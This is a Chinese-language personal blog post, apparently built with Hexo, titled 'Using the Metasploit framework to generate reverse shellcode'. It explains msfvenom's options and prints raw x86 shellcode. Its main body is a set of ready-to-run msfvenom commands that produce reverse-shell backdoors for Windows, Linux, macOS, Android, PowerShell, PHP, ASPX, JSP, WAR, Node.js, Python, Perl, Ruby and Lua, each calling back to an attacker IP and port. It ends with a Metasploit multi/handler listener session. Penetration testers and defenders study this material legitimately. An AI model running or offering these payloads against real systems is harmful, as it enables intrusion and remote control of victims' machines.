@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="网络安全," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="采用metasploit框架生成反弹shellcode1. metasploit框架安装安装命令如下： 123$ curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &amp;gt; msfin">
+<meta name="keywords" content="网络安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="采用metasploit框架生成反弹shellcode">
+<meta property="og:url" content="http:&#x2F;&#x2F;kanatsux.github.io&#x2F;2020&#x2F;09&#x2F;04&#x2F;%E9%87%87%E7%94%A8metasploit%E6%A1%86%E6%9E%B6%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shellcode&#x2F;index.html">
+<meta property="og:site_name" content="打怪升级的司图">
+<meta property="og:description" content="采用metasploit框架生成反弹shellcode1. metasploit框架安装安装命令如下： 123$ curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &amp;gt; msfin">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;kanatsux-imgs.oss-cn-chengdu.aliyuncs.com&#x2F;20200901133440.png">
+<meta property="og:updated_time" content="2020-09-08T09:28:12.033Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;kanatsux-imgs.oss-cn-chengdu.aliyuncs.com&#x2F;20200901133440.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://kanatsux.github.io/2020/09/04/采用metasploit框架生成反弹shellcode/"/>
+
+
+
+
+
+  <title>采用metasploit框架生成反弹shellcode | 打怪升级的司图</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">打怪升级的司图</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">咸鱼夏夏的进阶之路</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://kanatsux.github.io/2020/09/04/%E9%87%87%E7%94%A8metasploit%E6%A1%86%E6%9E%B6%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shellcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="司图">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="打怪升级的司图">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">采用metasploit框架生成反弹shellcode</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-04T17:50:44+08:00">
+                2020-09-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  7
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="采用metasploit框架生成反弹shellcode"><a href="#采用metasploit框架生成反弹shellcode" class="headerlink" title="采用metasploit框架生成反弹shellcode"></a>采用metasploit框架生成反弹shellcode</h1><h2 id="1-metasploit框架安装"><a href="#1-metasploit框架安装" class="headerlink" title="1. metasploit框架安装"></a>1. metasploit框架安装</h2><p>安装命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</span><br><span class="line">$ chmod 755 msfinstall</span><br><span class="line">$ ./msfinstall</span><br></pre></td></tr></table></figure>
+
+<p>安装后可用命令如下</p>
+<p><img src="https://kanatsux-imgs.oss-cn-chengdu.aliyuncs.com/20200901133440.png" alt=""></p>
+<p>其中msfvenom可用于生成shellcode或可执行文件。参数介绍如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Options:</span><br><span class="line">    -p, --payload       &lt;payload&gt;    Payload to use. Specify a &apos;-&apos; or stdin to use custom payloads 指定payload的功能</span><br><span class="line">        --payload-options            List the payload&apos;s standard options</span><br><span class="line">    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all</span><br><span class="line">    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload</span><br><span class="line">    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list) </span><br><span class="line">        --help-formats               List available formats</span><br><span class="line">    -e, --encoder       &lt;encoder&gt;    The encoder to use</span><br><span class="line">    -a, --arch          &lt;arch&gt;       The architecture to use </span><br><span class="line">        --platform      &lt;platform&gt;   The platform of the payload</span><br><span class="line">        --help-platforms             List available platforms</span><br><span class="line">    -s, --space         &lt;length&gt;     The maximum size of the resulting payload</span><br><span class="line">        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value)</span><br><span class="line">    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: &apos;\x00\xff&apos;</span><br><span class="line">    -i, --iterations    &lt;count&gt;      The number of times to encode the payload</span><br><span class="line">    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include</span><br><span class="line">    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template</span><br><span class="line">    -k, --keep                       Preserve the template behavior and inject the payload as a new thread</span><br><span class="line">    -o, --out           &lt;path&gt;       Save the payload</span><br><span class="line">    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats</span><br><span class="line">        --smallest                   Generate the smallest possible payload</span><br><span class="line">    -h, --help                       Show this message</span><br></pre></td></tr></table></figure>
+
+<p>以下为msfvenom部分参数中文说明及示例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">1. -p 指定payload的功能</span><br><span class="line"></span><br><span class="line">  --payload:确定payload类型</span><br><span class="line"></span><br><span class="line">  --payload-options:查看对应payload类型子选项</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line"> msfvenom -p linux/x86/exec CMD=/bin/sh   执行shell</span><br><span class="line">--------------------------------------------------------------------------------------------</span><br><span class="line">2. -a 指定处理器架构和操作平台</span><br><span class="line"></span><br><span class="line">--arch：指定处理器架构</span><br><span class="line">--platform：指定平台</span><br><span class="line">例：</span><br><span class="line">msfvenom -a x86 --platform linux</span><br><span class="line">--------------------------------------------------------------------------------------------</span><br><span class="line">3. -f 指定输出格式</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">msfvenom -a x86 --platform linux -f python payload以python语言格式输出</span><br><span class="line">--------------------------------------------------------------------------------------------</span><br><span class="line">4. -b 指定规避字符串（以字符的16进制表示）</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">msfvenom -a x86 --platform linux -b &quot;\x00\x0a&quot;  生成的payload中不允许出现&apos;\x00&apos;和&apos;\x0a&apos;</span><br><span class="line">--------------------------------------------------------------------------------------------</span><br><span class="line">5. -e 指定编码器</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">msfvenom -a x86 --platform linux -p linux/x86/exec CMD=&quot;sh&quot; -e x86/alpha_mixed </span><br><span class="line">--------------------------------------------------------------------------------------------</span><br><span class="line">6. -n 在payload前填充Nop Sled</span><br><span class="line"></span><br><span class="line">--nopsled:指定rop类型</span><br><span class="line"> &lt;length&gt;：指定rop长度</span><br><span class="line">例：</span><br><span class="line">msfvenom -a x86 --platform linux -p linux/x86/exec CMD=&quot;sh&quot; -n x86/single_byte 120</span><br><span class="line">--------------------------------------------------------------------------------------------</span><br><span class="line">7. -v 指定payload名字</span><br><span class="line">payload默认叫buf</span><br><span class="line">msfvenom -a x86 --platform linux -p linux/x86/exec CMD=&quot;sh&quot; -f python</span><br><span class="line">  No encoder or badchars specified, outputting raw payload</span><br><span class="line">  Payload size: 38 bytes</span><br><span class="line">  Final size of python file: 192 bytes</span><br><span class="line">  buf = &quot;&quot;</span><br><span class="line">  buf += &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;</span><br><span class="line">  buf += &quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03&quot;</span><br><span class="line">  buf += &quot;\x00\x00\x00\x73\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">msfvenom -a x86 --platform linux -p linux/x86/exec CMD=&quot;sh&quot; -v payload -f python</span><br><span class="line">  No encoder or badchars specified, outputting raw payload</span><br><span class="line">  Payload size: 38 bytes</span><br><span class="line">  Final size of python file: 222 bytes</span><br><span class="line">  payload = &quot;&quot;</span><br><span class="line">  payload += &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68&quot;</span><br><span class="line">  payload += &quot;\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52&quot;</span><br><span class="line">  payload += &quot;\xe8\x03\x00\x00\x00\x73\x68\x00\x57\x53\x89\xe1&quot;</span><br><span class="line">  payload += &quot;\xcd\x80&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-MSF-生成各种后门"><a href="#2-MSF-生成各种后门" class="headerlink" title="2. MSF 生成各种后门"></a>2. MSF 生成各种后门</h2><p><strong>Windows:</strong> 生成Windows后门.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=&lt;攻击机IP&gt; LPORT=&lt;攻击机端口&gt; -e x86/shikata_ga_nai -b &apos;\x00\x0a\xff&apos; -i 3 -f exe -o payload.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>Linux:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;攻击机IP&gt; LPORT=&lt;攻击机端口&gt; -f elf -o payload.elf</span><br></pre></td></tr></table></figure>
+
+<p><strong>MAC OS:</strong> 生成苹果MAC后门.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=&lt;攻击机IP&gt; LPORT=&lt;攻击机端口&gt; -f macho -o payload.macho</span><br></pre></td></tr></table></figure>
+
+<p><strong>Android:</strong> 生成安卓后门,需要签名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=&lt;攻击机IP&gt; LPORT=&lt;攻击机端口&gt; -f apk -o payload.apk</span><br></pre></td></tr></table></figure>
+
+<p><strong>PowerShell:</strong> 生成PowerShell.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=&lt;攻击机IP&gt; LPORT=&lt;攻击机端口&gt; -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1</span><br></pre></td></tr></table></figure>
+
+<p><strong>PHP:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt;</span><br><span class="line">shell.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>ASP.net:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=&lt;攻击机IP&gt; LPORT=&lt;攻击机端口&gt; -f aspx -o payload.aspx</span><br></pre></td></tr></table></figure>
+
+<p><strong>JSP:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=&lt;攻击机IP&gt; LPORT=&lt;攻击机端口&gt; -f raw -o payload.jsp</span><br></pre></td></tr></table></figure>
+
+<p><strong>War:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;攻击机IP&gt; LPORT=&lt;攻击机端口&gt; -f raw -o payload.war</span><br></pre></td></tr></table></figure>
+
+<p><strong>Node.js:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=&lt;攻击机IP&gt; LPORT=&lt;攻击机端口&gt; -f raw -o payload.js</span><br></pre></td></tr></table></figure>
+
+<p><strong>Python:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.py</span><br></pre></td></tr></table></figure>
+
+<p><strong>Perl:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.pl</span><br></pre></td></tr></table></figure>
+
+<p><strong>Ruby:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.rb</span><br></pre></td></tr></table></figure>
+
+<p><strong>Lua:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.lua</span><br></pre></td></tr></table></figure>
+
+<h2 id="MSF-生成ShellCode"><a href="#MSF-生成ShellCode" class="headerlink" title="MSF 生成ShellCode"></a>MSF 生成ShellCode</h2><p><strong>Windows ShellCode:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</span><br></pre></td></tr></table></figure>
+
+<p><strong>linux shellcode:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</span><br></pre></td></tr></table></figure>
+
+<p><strong>mac shellcode:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</span><br></pre></td></tr></table></figure>
+
+<h2 id="MFS控制主机-启动侦听程序"><a href="#MFS控制主机-启动侦听程序" class="headerlink" title="MFS控制主机,启动侦听程序"></a>MFS控制主机,启动侦听程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt;</span><br><span class="line">msf5 exploit(multi/handler) &gt; show options</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.1.7</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 8888</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.7:8888</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    司图
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://kanatsux.github.io/2020/09/04/%E9%87%87%E7%94%A8metasploit%E6%A1%86%E6%9E%B6%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shellcode/" title="采用metasploit框架生成反弹shellcode">http://kanatsux.github.io/2020/09/04/%E9%87%87%E7%94%A8metasploit%E6%A1%86%E6%9E%B6%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shellcode/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"><i class="fa fa-tag"></i>  网络安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/09/04/windows%E4%B8%8B%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F/" rel="next" title="windows下后台运行程序">
+                <i class="fa fa-chevron-left"></i> windows下后台运行程序
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/11/27/MySQL%E4%B8%AD%E7%9A%84%E6%97%B6%E9%97%B4%E7%B1%BB%E5%9E%8B/" rel="prev" title="MySQL中的时间类型">
+                MySQL中的时间类型 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="司图" />
+            
+              <p class="site-author-name" itemprop="name">司图</p>
+              <p class="site-description motion-element" itemprop="description">既然进来了，就喝杯茶吧！</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+                
+              
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/kanatsux" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:wowoohi@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lauyuenn.gitee.io/lauyuenn_blog/" title="傻朝夕" target="_blank">傻朝夕</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
